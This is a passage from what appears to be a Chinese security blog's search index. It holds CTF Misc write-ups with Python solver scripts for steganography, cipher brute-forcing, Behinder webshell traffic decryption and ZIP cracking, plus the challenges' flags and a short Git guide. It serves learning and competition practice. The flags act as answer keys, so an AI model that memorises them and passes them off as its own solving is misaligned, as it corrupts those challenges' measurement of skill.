'0,0,960,1632,3120,48,96,448,96,48,48,3120,1632,960,0,0': '3', '0,64,192,448,960,704,1728,3264,3264,6336,8176,192,192,480,0,0': '4', '0,0,4080,3072,3072,3072,4032,3680,48,48,48,3120,1632,960,0,0': '5', '0,0,960,1632,3120,3072,3520,3680,3120,3120,3120,3120,1632,960,0,0': '6', '0,0,4080,4080,2096,96,192,192,384,384,768,768,768,768,0,0': '7', '0,0,960,1632,3120,3120,1632,960,1632,3120,3120,3120,1632,960,0,0': '8', '0,0,960,1632,3120,3120,3120,3120,1648,1008,48,3120,1632,960,0,0': '9', '0,0,0,0,0,0,1984,3168,96,2016,3168,3168,2008,0,0,0': 'a', '0,0,3584,1536,1536,1536,2016,1560,1560,1560,1560,1560,3056,0,0,0': 'b', '0,0,0,0,0,0,992,3120,3072,3072,3072,3120,2016,0,0,0': 'c', '0,0,224,96,96,96,2","date":"2023-12-18","objectID":"/posts/fde34a9/:0:0","tags":["CTF","Misc","Writeup"],"title":"2023 楚慧杯网络空间安全实践能力竞赛 Misc Writeup","uri":"/posts/fde34a9/"},{"categories":["CTF"],"content":"在群里偶然看到了这道题，当初刷题的时候没有刷到过，感觉挺有意思的，就打算深入分析一下。 这个题目在 BUUOJ 上可以搜到 题目来源 题目附件首先是给了这样一张杂乱的图片，比较明显的是有大量的红色和黑色的像素 用PS打开仔细查看一下，可以发现每一列都有且仅有一段长度相同的红色像素段 于是猜想要从红色的像素段入手解题，把每一列的像素都根据红色像素段平移，直到对齐所有的红色像素段 脚本的思路就是：爆破偏移量，然后判断四个像素值即可，其中两个是白色，其中两个是红色，简单来说就是判断红色和白色相接的位置 解题脚本如下 from PIL import Image from random import randint f = './attachment.png' img = Image.open(f) print('Width: {}\\n'.format(img.size[0])) print('Height: {}\\n'.format(img.size[1])) pixels = img.load() for r in range(img.size[0]): backup_row = [] # 将每一列的像素都拷贝到新的列表中 for c in range(img.size[1]): backup_row += [pixels[r, c]] done = False # 爆破每列的偏移量 for i in range(0, img.size[1]): if done: break # 根据偏移量重新排列每列的像素 for c in range(img.size[1]): pixels[r, (c + i) % img.size[1]] = backup_row[c] # 判断红色像素段是否对齐 if (pixels[r, 2] == (255, 0, 0, 255) and pixels[r, 12] == (255, 0, 0, 255) and pixels[r, 1] == (255, 255, 255, 255) and pixels[r, 50] == (255, 255, 255, 255)): done = True print(\"Done: {}\".format(r)) img.show() 脚本运行完即可得到下面这张图片,flag就在里面 然后群里看到的题目是这张图片，原理还是一样的，就红色像素段的长度和像素值稍微改了一下 这里就直接给出解题脚本了，其实就是上面那个脚本稍微改了一下 from PIL import Image f = './file.png' img = Image.open(f) print('Width: {}\\n'.format(img.size[0])) print('Height: {}\\n'.format(img.size[1])) pixels = img.load() # for r in range(img.size[0]): # for c in range(img.size[1]): # print(pixels[r, c]) for r in range(img.size[0]): backup_row = [] # 将每一列的像素都拷贝到新的列表中 for c in range(img.size[1]): backup_row += [pixels[r, c]] done = False # 爆破每列的偏移量 for i in range(0, img.size[1]): if done: break # 根据偏量重新排列每列的像素移 for c in range(img.size[1]): pixels[r, (c + i) % img.size[1]] = backup_row[c] # 判断红色像素段是否对齐 if (pixels[r, 4] == (237, 28, 36, 255) and pixels[r, 141] == (237, 28, 36, 255) and pixels[r, 3] == (255, 255, 255, 255) and pixels[r, 142] == (255, 255, 255, 255)): done = True print(\"Done: {}\".format(r)) img.save(\"solved.png\") img.show() 运行脚本后即可得到这张图片 附：出题脚本 from PIL import Image from random import randint import sys f = './image_original.png' img = Image.open(f) print('Width: {}\\n'.format(img.size[0])) print('Height: {}\\n'.format(img.size[1])) pixels = img.load() for r in range(img.size[0]): # for c in range(img.size[1]): # print('{}: {}'.format(c, pixels[r, c])) backup_row = [] for c in range(img.size[1]): backup_row += [pixels[r, c]] start = randint(0, img.size[1]) for c in range(img.size[1]): pixels[r, (c + start) % img.size[1]] = backup_row[c] img.save('./image_edited.png') img.show() ","date":"2023-12-10","objectID":"/posts/00658ee/:0:0","tags":["CTF","Misc"],"title":"2020 b01lers Misc image_adjustments 赛题详解","uri":"/posts/00658ee/"},{"categories":["Skills"],"content":"对程序员来说Git是一个不得不用的东西，因此打算好好学习一下 使用 SSH 密钥登录 Github 本地生成 SSH 密钥 ssh-keygen -t rsa -b 4096 -C \"Your_Email\" 将公钥添加到 Github 打开 ~/.ssh/id_rsa.pub 文件并复制公钥内容 登录 GitHub，进入 Settings \u003e SSH and GPG keys，点击 New SSH key 将公钥粘贴进去，点击 Add SSH key 测试链接 ssh -T git@github.com 如果显示 “Hi XXX! You’ve successfully authenticated…” 则表示 SSH 配置成功 然后就可以用SSH链接来克隆仓库了 git clone git@github.com:username/example_repo.git 修改本地仓库并推送到远程仓库 先将远程的仓库克隆到本地，然后进行修改，修改完后使用git status查看仓库状态 然后可以使用git add -A命令将改动添加到暂存区 git add 和 git add -A 的区别: git add -A：添加所有类型的改动（新增、修改和删除） git add .：仅添加当前目录下的新增和修改，不包括删除 将修改的文件都放到暂存区后，我们就可以使用git commit命令提交更改 提交后会再git的历史纪录中新添加一个版本，可以使用 git log 命令查看 然后我们就可以用 git push origin main 命令把本地的内容提交到远程的main分支上了 不同版本之间的切换 使用git log --oneline查看之前的版本 然后可以使用 git reset --hard 版本对应的Hash值 来回退到之前的版本 然后修改文件，之后的步骤和上面是一样的 git add -A git commit -m \"change\" 这里回退了之后如果要回到原来的版本，需要使用git reflog命令查看原来版本的hash值 然后使用 git reset --hard 版本对应的Hash值 来切换版本即可 ","date":"2023-12-08","objectID":"/posts/0d2a7eb/:0:0","tags":["Skills"],"title":"从零开始，快速入门Git","uri":"/posts/0d2a7eb/"},{"categories":["Writeup"],"content":"全靠队友带飞。拿了省一 这里对赛中的部分Misc题进行一个简单的复盘 本文中涉及的具体题目附件可以进我的 知识星球 获取 初赛 题目名称 Easy_Cipher 题目如下： [\"Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08。RUNCIDAgMTI4IHNpeCBudW1iZXJz\",\"Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08\"] 把中间的那段密文base64解码可以得到 RUNCIDAgMTI4IHNpeCBudW1iZXJz ECB 0 128 six numbers 因此写个Python脚本爆破一下AES-ECB模式的密钥即可 import base64 from Crypto.Cipher import AES def aes_decrypt(data, key): key = key.encode('utf-8')+b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' # print(key) cipher = AES.new(key, AES.MODE_ECB) decrypted = cipher.decrypt(base64.b64decode(data)) return decrypted if __name__ == \"__main__\": data = 'Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08' for i in range(100000,999999): key = str(i) res = aes_decrypt(data=data,key=key) res = str(res) if 'flag' in res or 'DASCTF' in res: print(f\"key:{key}\") print(f\"flag:{res}\") break #key:515764 #flag:b'DASCTF{W0w_Y0u_Succ3s5ful1y_Cr4ck_Th1s_C1ph3r}\\x00\\x00' 题目名称 Ez_misc 附件给了一个未知后缀的yuanshen文件，用010打开观察文件头，发现是单字节翻转后的JPG图片 将数据翻转回来，改后缀为jpg，即可得到下图 用stegseek爆破一下，发现藏了一个flag.txt 仔细观察内容，感觉是摩斯电码，因此我们CyberChef解码一下即可得到flag：flag{df4f635ab342a5b3bb855a464d7bb4ec} 题目名称 Steins_Gate 题目附件给了下面这张图片，图片有点大，有50M 在PS中打开，发现图片由很多嘟噜嘟噜组成，然后发现一个汉字占用了16x16的像素区块，图像的宽高也刚好是16的倍数(10752x6048) 因此我们写一个脚本，获取每个区块中出现频率最高的像素，并尝试恢复原图(672x378) def fix_img(): img = Image.open(\"Steins_Gate.png\") width,height = img.size # 10752 6048 source_data = [] for y in range(0,height,16): for x in range(0,width,16): pixel_dict = {} # 获取每个16x16区块中出现频率最高的像素 for j in range(y,y+16): for i in range(x,x+16): pixel = img.getpixel((i,j)) if pixel != (211, 211, 211): if pixel not in pixel_dict: pixel_dict[pixel] = 1 else: pixel_dict[pixel] += 1 sorted_pixel = sorted(pixel_dict.items(),key = lambda item:item[1],reverse=True) most_pixel = sorted_pixel[0][0] source_data.append(most_pixel) new_img = Image.new(\"RGB\",(width//16,height//16)) new_img.putdata(source_data) # [(255, 0, 0), (0, 255, 0), (0, 0, 255)] new_img.show() # new_img.save(\"new.png\") 运行以上脚本，即可恢复得到下图 zsteg和StegSolve扫一下，发现存在LSB隐写 尝试直接提取出来，但是发现每串base64编码数据后面都有垃圾数据 因此我们尝试写个脚本提取 def extract_lsb(): res = \"\" base64_data = [] img = Image.open(\"new.png\") width,height = img.size # 672 378 for y in range(height): lsb_data = \"\" # 一行一行地提取LSB数据 for x in range(width): pixel = img.getpixel((x,y)) lsb_data += str(pixel[0] \u0026 1) + str(pixel[1] \u0026 1) + str(pixel[2] \u0026 1) bytes_data = libnum.b2s(lsb_data) # print(bytes_data) try: base64_data.append(bytes_data[:bytes_data.index(b\"==\")+2]) except: pass for item in base64_data: res += item.decode() + '\\n' with open(\"base64.txt\",\"w\") as f: f.write(res) 提取出来的数据CyberChef解码可以得到一张jpg图片 然后还发现上面的base64编码的数据中存在base64隐写，直接使用工具提取出来可以得到：DuDuLu~T0_Ch3@t_THe_w0r1d 最后使用得到的密钥outguess解密图片即可得到flag：DASCTF{699948e3ae1195f819b23b759684ac8e} 完整解题代码如下： from PIL import Image import libnum def fix_img(): img = Image.open(\"Steins_Gate.png\") width,height = img.size # 10752 6048 source_data = [] for y in range(0,height,16): for x in range(0,width,16): pixel_dict = {} # 获取每个16x16区块中出现频率最高的像素 for j in range(y,y+16): for i in range(x,x+16): pixel = img.getpixel((i,j)) if pixel != (211, 211, 211): if pixel not in pixel_dict: pixel_dict[pixel] = 1 else: pixel_dict[pixel] += 1 sorted_pixel = sorted(pixel_dict.items(),key = lambda item:item[1],reverse=True) most_pixel = sorted_pixel[0][0] source_data.append(most_pixel) new_img = Image.new(\"RGB\",(width//16,height//16)) new_img.putdata(source_data) # [(255, 0, 0), (0, 255, 0), (0, 0, 255)] new_img.show() # new_img.save(\"new.png\") def extract_lsb(): res = \"\" base64_data = [] img = Image.open(\"new.png\") width,height = img.size # 672 378 for y in range(height): lsb_data = \"\" # 一行一行地提取LSB数据 for x in range(width): pixel = img.getpixel((x,y)) lsb_data += str(pixel[0] \u0026 1) + str(pixel[1] \u0026 1) + str(pixel[2] \u0026 1) bytes_data = libnum.b2s(lsb_data) # print(bytes_data) try: base64_data.append(bytes_data[:bytes_data.index(b\"==\")+2]) except: pass for item in base64_data: res += item.decode() + '\\n' with op","date":"2023-11-07","objectID":"/posts/db7acab/:0:0","tags":["CTF","Misc","Writeup"],"title":"2023 浙江省大学生网络与信息安全竞赛 Misc Writeup","uri":"/posts/db7acab/"},{"categories":["Writeup"],"content":"2023 台州市网络安全大赛 Misc Writeup 本文中涉及的具体题目附件可以进我的 知识星球 获取 题目名称 这是神马 附件给了一个流量包，打开翻看发现是 冰蝎AES-CBC 流量分析，并且告诉了我们密钥：$key=\"144a6b2296333602\" 然后发现流量中传输了一个加密后的 flag.tar.gz 我们直接手动提取出来保存为 flag.tar.gz，然后我们在流量包中解密冰蝎流量，可以得到加密的命令 命令中也直接告诉了我们加密的密钥，因此我们直接用以下命令解密还原即可 openssl des3 -d -salt -k th1sisKey -in flag.tar.gz -out flag_decrypted.tar.gz 解密后解压可以得到一个 flag 文件，内容如下： 🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒 最后我们用上面的密钥 th1sisKey 再解一次 emoji-aes 即可得到 flag：DASCTF{342bffc5e8e16f0cc83bbd298efe803e} 题目名称 李先生的计算机 题面信息如下： 有一天晚上，李先生毕业多年的\"大学同学\"找他借钱。你知道对方的银行卡号和李先生借给他多少钱吗？ flag格式：DASCTF{金额_银行卡号}，如：DASCTF{100_1234567890} 题目附件给了一个 2.ad1 文件，我们可以拿 FTK Imager 挂载一下 然后发现有网易邮箱大师的数据目录 直接导出，发现是 sqlite 数据库，直接在 vscode 中用 SQLite 插件打开，可以得到如下关键信息 然后在附件中有个 1 文件，010 打开发现是个加密的 7z 压缩包，压缩包密码是上面的：dbt_1126_tta 因此我们改后缀为.7z解压，可以得到如下这张 JPG 图片 根据邮件提示，这张图片用 JPG 加密软件加密了，经过尝试发现是 JPHS，并且解密密码也告诉我们了：123654 直接用 JPHS 解密即可得到银行卡号：6222025567723373838 综上，最后的 flag 为：DASCTF{300_6222025567723373838} 题目名称 Black Mamba 附件给了一张Black Mamba.jpg，但是 010 打开发现是 PNG 图片的数据，因此改后缀为 .png 然后再用 010 打开 发现图片末尾有多余数据，我们手动提取出来 发现异或一个 0x18 可以得到一个加密的压缩包 并且压缩包注释中给了提示，猜测是弱密码 用字典爆破一下即可得到解压密码：1qaz@WSX 解压后可以得到一个 flag 文件，内容如下： EAOJYU?TRX\u003e{XPFABY{8{24+ 有人好像对我键盘做了点手脚，看起来像坏了一样。 根据提示，猜测是换了一种键盘布局，经过尝试发现是用了 Dvorak 键盘布局 写个脚本转换一下即可得到最后的 flag：DASCTF{KOBE_BRYANT_8_24} qwerty_lower = r\"\"\"qwertyuiop[]{}-=_+\\asdfghjkl;'zxcvbnm,./\"\"\" dvorak_lower = r\"\"\"',.pyfgcrl/=?+[]{}|aoeuidhtns-;qjkxbmwvz\"\"\" qwerty_upper = r\"\"\"QWERTYUIOP[]{}-=_+\\ASDFGHJKL;'ZXCVBNM,./\"\"\" dvorak_upper = r\"\"\"\"\u003c\u003ePYFGCRL/=?+[]{}|AOEUIDHTNS_:QJKXBMWVZ\"\"\" # 构建映射字典 d2q = str.maketrans(dvorak_lower + dvorak_upper,qwerty_lower + qwerty_upper) q2d = str.maketrans(qwerty_lower + qwerty_upper,dvorak_lower + dvorak_upper) def dvorak_to_qwerty(text: str) -\u003e str: return text.translate(d2q) def qwerty_to_dvorak(text: str) -\u003e str: return text.translate(q2d) if __name__ == \"__main__\": text = \"EAOJYU?TRX\u003e{XPFABY{8{24+\" print(dvorak_to_qwerty(text)) # DASCTF{KOBE_BRYANT_8_24} print(qwerty_to_dvorak(text)) 当然，也可以使用随波逐流解密 ","date":"2023-11-07","objectID":"/posts/51c437e/:0:0","tags":["Misc","CTF","Writeup"],"title":"2023 台州市网络安全大赛 Misc Writeup","uri":"/posts/51c437e/"},{"categories":["CTF"],"content":"这是一个搁置了很久的坑，想当初被折磨了好久，这题还是需要一点点脑洞的。 题目的附件很简单，一共就给了三张png图片：a.png、k.png、题目.png 发现a.png和k.png的图片尺寸大小是一样的，所以猜测可能是一一对应的关系 发现一一对应的关系后可能就比较容易想到是坐标 然后题目.png中应该就是每个麻将所对应的具体值，按照下图这样给每个麻将编号 然后把a和k中麻将的值作为横纵坐标的值，用以下脚本画图即可得到flag import matplotlib.pyplot as plt x = [1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 9, 9, 9, 9, 9, 9, 10, 10, 12, 12, 12, 12, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 13, 14, 14, 14, 14, 14, 14, 14, 14, 15, 15, 15, 15, 15, 15, 15, 16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 17, 17, 17, 17, 18, 18, 18, 18, 18, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 19, 20, 20, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 22, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 23, 24, 24, 24, 24, 24, 24, 24, 24, 24, 24, 25, 25, 25, 25, 25, 25, 25, 25, 25, 25, 25, 26, 26, 26, 26, 26, 26, 26, 26, 26, 26, 27, 27, 27, 27, 27, 27, 27, 27, 27, 27, 27, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 28, 29, 29, 29, 29, 29, 31, 31, 31, 31, 31, 31, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 33, 34, 34, 34, 34, 34, 34, 34, 34, 34, 35, 35, 35, 35, 35, 35, 35, 35, 35, 35, 35, 36, 36, 36, 36, 36, 36, 36, 37, 37, 37, 37, 37, 37, 37, 37, 37, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 38, 39, 39, 39] y = [4, 5, 10, 30, 3, 4, 5, 6, 10, 29, 30, 3, 4, 10, 16, 17, 22, 23, 24, 25, 29, 30, 2, 3, 4, 5, 10, 15, 16, 18, 21, 22, 24, 25, 29, 30, 3, 4, 10, 15, 17, 18, 19, 21, 22, 25, 28, 29, 3, 4, 10, 15, 16, 18, 19, 21, 22, 25, 29, 3, 4, 10, 11, 12, 13, 15, 18, 19, 22, 23, 24, 25, 29, 30, 3, 4, 11, 12, 15, 16, 17, 18, 19, 20, 25, 29, 30, 21, 22, 24, 25, 30, 31, 23, 24, 22, 23, 24, 25, 2, 3, 4, 5, 9, 10, 11, 12, 16, 17, 18, 19, 24, 25, 2, 5, 6, 9, 12, 19, 23, 24, 5, 9, 12, 18, 19, 22, 23, 4, 5, 9, 12, 17, 18, 23, 24, 3, 4, 9, 12, 16, 17, 24, 25, 3, 9, 12, 16, 25, 3, 4, 5, 6, 9, 10, 11, 12, 16, 17, 18, 19, 21, 22, 23, 24, 25, 10, 11, 3, 4, 5, 6, 10, 11, 12, 17, 18, 19, 24, 25, 3, 6, 7, 9, 10, 16, 17, 19, 20, 22, 23, 24, 25, 3, 6, 7, 9, 10, 16, 19, 20, 24, 25, 3, 6, 7, 10, 11, 12, 16, 19, 20, 24, 25, 3, 6, 7, 12, 13, 16, 19, 20, 24, 25, 3, 6, 7, 9, 12, 13, 16, 19, 20, 24, 25, 3, 4, 6, 9, 10, 11, 12, 16, 17, 19, 20, 24, 25, 4, 5, 17, 18, 19, 10, 11, 12, 13, 25, 31, 4, 5, 6, 10, 11, 12, 13, 17, 18, 19, 23, 24, 25, 26, 32, 3, 4, 6, 7, 12, 16, 17, 23, 24, 26, 32, 6, 7, 11, 16, 17, 23, 24, 26, 32, 6, 11, 12, 17, 18, 19, 23, 24, 25, 26, 33, 5, 12, 13, 19, 20, 26, 32, 4, 5, 13, 16, 19, 20, 25, 26, 32, 4, 5, 6, 7, 9, 10, 11, 12, 13, 16, 17, 18, 19, 24, 25, 31, 32, 23, 24, 31] # print(len(x),len(y)) # 341:341 一一对应，故猜测可能是坐标 plt.scatter(x, y) plt.xlabel('a') plt.ylabel('k') plt.show() ","date":"2023-10-23","objectID":"/posts/ade0159/:0:0","tags":["CTF","Misc"],"title":"2023 CISCN初赛 Misc 国粹 赛题详解","uri":"/posts/ade0159/"},{"categories":["Writeup"],"content":"香山杯的Misc除了签到爆零了，因此打算复盘一下。 题目名称 pintu 打开压缩包，得到4703张黑白的png文件，还有一个tip图片，tip图片如下： 看了一会这个tip，非常确定题目肯定要考查八进制 然后这里被这个题目名字给误导了，比赛的时候一直以为是图片拼接类型的题目(不知道是不是出题人故意的) 之后读取图片的宽高，发现每张图片的宽都是65px，但是高度是有不一样的，于是用以下脚本提取每张图片的高 然后经过尝试发现，应该要把每张图片的高进行八进制转十进制，然后转为Ascii码输出 输出后发现出题人很贴心，连空格都给你精心准备好了，于是以空格为分隔，再次转Ascii码 之后得到一串base32编码后的密文，解码后得到一串base64编码后的密文，直接解码会出错，猜测是换表了 def get_image_dimensions(image_path): with Image.open(image_path) as img: return img.width, img.height def height_Steg(): heights = [] current_directory = os.getcwd() for i in range(1, 4704): image_name = f\"{i}.png\" image_path = os.path.join(current_directory, image_name) if os.path.exists(image_path): width, height = get_image_dimensions(image_path) heights.append(height) # print(f\"{image_name}: Width = {width}, Height = {height}\") else: print(f\"{image_name} does not exist.\") res = '' data = '' for item in heights: decimal_heights = int(str(item),8) res+=chr(decimal_heights) #print(res) res = res.split(' ') for item in res: data +=chr(int(item)) #print(data) data = base64.b32decode(data) print(data) 于是再回去查看图片，将白色图片转为1，黑色图片转为0，并在前面补零对齐八位，然后再转为字符串 def translate_pixel(): res = '' output = [] current_directory = os.getcwd() for i in range(1, 4704): image_name = f\"{i}.png\" image_path = os.path.join(current_directory, image_name) if os.path.exists(image_path): pixel_data = get_Image_Pixel(image_path) if pixel_data == 255: res += '1' else: res += '0' if len(res) % 8!=0: # 这里一定要注意是在前面补零还是在后面补零，一般都是在前面补零对齐 # res+='0'*(8-len(res)%8) res = '0'*(8-len(res)%8) + res for i in range(0,len(res),8): binary_segment = res[i:i+8] int_value = int(binary_segment,2) char_value = chr(int_value) output += [char_value] # print(output) print(''.join([str(x) for x in output])) 转换后得到以下内容，很明显里面藏了一个base64的表 flagçå°666cæ¯ä¸æ¯ç¹å«å´å¥ï¼å¾å¯æflagå¹¶ä¸å¨è¿ãï¼çå¤´ä¿å½ï¼ï¼æ¢ç¶èµ°å°äºè¿éï¼é£æä¹ç»ä¸ä¸ªéå³çå³é®ä¿¡æ¯æ¿å»å§ï¼å»æ¾å°çæ­£çflagå§ï¼sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W åï¼å¯¹äºãæ¿èµ°ä¹åçä¸çæç²¾å¿æéçç¬è¯å§ï¼çäººæçï¼æçç¸å¼æªï¼âç °âå°ä¸å£°æªåä¹åçäººæ­»äºãçç¸åçè°ï¼å·ç¬ä¸å£°ï¼ âæ²¡æ³å°å§ï¼ææ¯åå°å¼§ãâå¥½ä¸å¥½ç¬ï¼ ææ²¡ææè§ä¸åå¦ï¼å¤§èæ´æ¸æ°äºãà¸Õâ¢ï»â¢Õ à¸ 用里面的base64的表去解码之前得到的base64编码的字符串，将得到的base64解码为图片后得到以下图片，一眼npiet 最后直接用 npiet 在线网站解密即可得到flag：flag{4b6c1737-27e5-41c4-95e3-f70ad196063e} 完整解题脚本如下 from PIL import Image import base64 import os def get_image_dimensions(image_path): with Image.open(image_path) as img: return img.width, img.height def get_Image_Pixel(image_path): with Image.open(image_path) as img: pixel_data = img.getpixel((0,0))[0] return pixel_data def height_Steg(): heights = [] current_directory = os.getcwd() for i in range(1, 4704): image_name = f\"{i}.png\" image_path = os.path.join(current_directory, image_name) if os.path.exists(image_path): width, height = get_image_dimensions(image_path) heights.append(height) # print(f\"{image_name}: Width = {width}, Height = {height}\") else: print(f\"{image_name} does not exist.\") res = '' data = '' for item in heights: decimal_heights = int(str(item),8) res+=chr(decimal_heights) # print(res) res = res.split(' ') for item in res: data +=chr(int(item)) # print(data) data = base64.b32decode(data) print(data) def translate_pixel(): res = '' output = [] current_directory = os.getcwd() for i in range(1, 4704): image_name = f\"{i}.png\" image_path = os.path.join(current_directory, image_name) if os.path.exists(image_path): pixel_data = get_Image_Pixel(image_path) if pixel_data == 255: res += '1' else: res += '0' if len(res) % 8!=0: # 这里一定要注意是在前面补零还是在后面补零，一般都是在前面补零对齐 # res+='0'*(8-len(res)%8) res = '0'*(8-len(res)%8) + res for i in range(0,len(res),8): binary_segment = res[i:i+8] int_value = int(binary_segment,2) char_value = chr(int_value) output += [char_value] # print(output) print(''.join([str(x) for x in output])) if __name__ == \"__main__\": height_Steg() print('='*70) translate_pixel() 题目名称 AI TODO… ","date":"2023-10-17","objectID":"/posts/b36b466/:0:0","tags":["CTF","Misc","Writeup"],"title":"2023 香山杯网络安全大赛 Misc Writeup","uri":"/posts/b36b466/"},{"categories":["Writeup"],"content":"差一题就能AK Misc了，还是比较遗憾 初赛 题目名称 EZ_Misc 附件给了一张改过宽高的图片，恢复正确宽高后提示flag不在这里 然后010打开，发现末尾有一个压缩包，还有一张没有文件头但是有文件尾的png图片，并给了提示：5位数字 把文件头中的04 03改成03 04，提取压缩包并解压可以得到一串Gronsfeld密文 可以自己写个脚本爆破 from pycipher import Gronsfeld from itertools import product cipher_text = 'vzbtrvplnnvphsqkxsiqibroou' # five numbers burst for key in product(range(10), repeat=5): # print(key) plain_text = Gronsfeld(key).decipher(cipher_text) if 'TRYTO' in plain_text: print(key,plain_text) 也可以用用github上的工具爆破密文，得到提示：叫我们尝试截图工具 try to think the snippingtools 工具链接：https://github.com/karma9874/CryptAnalysis CVE-2023-28303：https://github.com/frankthetank-music/Acropalypse-Multi-Tool DASCTF{CvE_1s_V3Ry_intEr3sting!!} 题目名称 Matryoshka 下载下来得到一个img文件，用磁盘精灵挂载 可以提取出一张jpg图片、一个加密后的encrypt文件 然后还有一个rar压缩包，foremost提取压缩包得到另一张jpg图片 然后对两张图片使用盲水印解密 得到密钥：watermark_is_fun 然后用veracrypt挂载刚刚那个encrypt文件，里面有个flag.txt 用vscode打开发现存在零宽字符，在线网站解密。然后base64+维吉尼亚解密即可 题目名称 程序员 Quby 下载附件后得到一张png图片，发现末尾隐藏了rar压缩包，提取出来后发现需要密码 搜索死亡之链，找到如下的夏多密码 https://www.bilibili.com/video/BV1HR4y1G7Wc/?vd_source=db6b9c113a0b0a0351d22c0b2729de1a 参考上面这个视频即可解得密钥：HAVEANICEDAY 然后用cloacked-pixel解密可以得到另一个密码 we1c0met0ycbCTF!!! 然后用这个密码去解压压缩包，得到两个xlsx和一个wav文件 发现xlsx中存在隐藏数据，取消wbw隐藏，然后把3.33替换为0，6.66替换为1，4.46为0，5.53为1 然后对单元格进行突出显示 把两个xlsx中的数据合并到一起，得到密钥：w0wyoudo4goodj0b 然后用这个密钥去Deepsound解密，可以得到一个Family_bucket.zip压缩包，猜测是base全家桶 解压压缩包得到flag.txt和fl4g.txt，里面各有一段密文 :JOJ[=%tJD9gr2Q79*;T:-qZD=]S0c:0'nT7orYd9L_TD=Ys#Z9iY:q;-$Xo:dQs\u003e9ia\u0026M9i3]K5r2G\u003e8Oc'9=%u:f8QIW;;bp(\\8Ms%=10QJ$:KBnd\u003cAmK;7p.T97oN8J 上述密文base85+base32解码后得到以下内容 sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ SjaoNgS0xgagUTpwe3QwHn4MrbkD/OUwqOQG/bpveg6Mqa4WH0k46 然后换表base64解码即可得到flag DASCTF{Qu6y_d0_not_lik3_w0rking_4t_all} 题目名称 Easy_VMDK 下载得到一个压缩包，store加密方式，直接用bkcrack进行明文攻击 挂载flag.vmdk，提取出flag.zip和key.txt 从flag.zip中foremost分离出了一个png2txt.py import cv2 import base64 import binascii img = cv2.imread(\"key.png\") r, c = img.shape[:2] print(r, c) # 137 2494 with open(\"key.txt\", \"w\") as f: for y in range(r): for x in range(c): uu_byte = binascii.a2b_uu(', '.join(map(lambda x: str(x), img[y, x])) + \"\\n\") f.write(base64.b64encode(uu_byte).decode() + \"\\n\") chatGPT直接写一个恢复脚本得到压缩包解压密码 import cv2 import base64 import binascii # Read the contents of the key.txt file with open(\"key.txt\", \"r\") as f: lines = f.readlines() # Prepare an empty list to store the decoded pixel values decoded_pixels = [] for line in lines: # Strip the newline and decode the base64 encoded string decoded_base64 = base64.b64decode(line.strip()) # Convert the decoded bytes back using b2a_uu uu_decoded = binascii.b2a_uu(decoded_base64) # Split the decoded string to get the individual RGB values pixel_values = [int(val) for val in uu_decoded.split(b', ')] # Append the pixel values to the list decoded_pixels.append(pixel_values) # Convert the list of pixel values to a NumPy array import numpy as np decoded_pixels = np.array(decoded_pixels, dtype=np.uint8) # Reshape the array to the original image shape reshaped_image = decoded_pixels.reshape((137, 2494, 3)) # Save the recreated image cv2.imwrite(\"recreated_image.png\", reshaped_image) 解压压缩包即可得到flag：DASCTF{2431a606-00a3-4698-8b0f-eb806a7bb1be} 题目名称 GIFuck 发现GIF每一帧的时间长度不同，存在时间轴隐写，写个脚本提取 from PIL import Image, ImageSequence import os dic = {} # 打开GIF文件 with Image.open(\"flag.gif\") as img: frames = [frame.copy() for frame in ImageSequence.Iterator(img)] for i, frame in enumerate(frames): # 获取帧的时长（通常在'duration'键中） duration = frame.info.get('duration', 0) # 按需提供默认值 dic[i+1] = duration // 60 # print(f\"Frame {i+1}: Duration = {duration}ms\") # print(dic) current_directory = os.getcwd() all_files = [f for f in os.listdir(current_directory) if f.endswith('.png')] sorted_files = sorted(all_files, key=lambda x: int(x.split('.')[0])) res = '' for file in sorted_files: index = int(file.split('.')[0]) time = dic[index] # print(index,time) file_path = os.path.join(current_directory, file) size = os.path.getsize(file_path) if size == 310: res += time*'\u003c' elif size == 304: res += time*'\u003e","date":"2023-09-10","objectID":"/posts/940b876/:0:0","tags":["CTF","Misc","Writeup"],"title":"2023 羊城杯网络安全大赛 Misc Writeup","uri":"/posts/940b876/"},{"categories":["CTF"],"content":"这篇博客用来记录一下沙箱逃逸相关的一些知识点 Python 沙箱逃逸(pyjail) 获取常用的unicode碰撞字符 from unicodedata import normalize from string import ascii_lowercase from collections import defaultdict lst = 